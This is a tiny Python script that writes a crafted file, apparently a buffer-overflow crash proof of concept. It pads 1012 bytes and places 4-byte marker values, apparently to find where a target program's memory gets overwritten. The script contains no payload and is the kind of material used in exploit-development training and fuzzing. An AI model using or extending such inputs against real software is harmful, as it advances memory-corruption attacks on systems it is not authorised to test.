with open("crash-3.txt", "wb") as f:

    buf = b"\x41" * 1012
    buf += b"\x42" *4
    buf += b"\x43" *4     
    buf += b"\x44" * 1988

    f.write(buf)
    f.close()
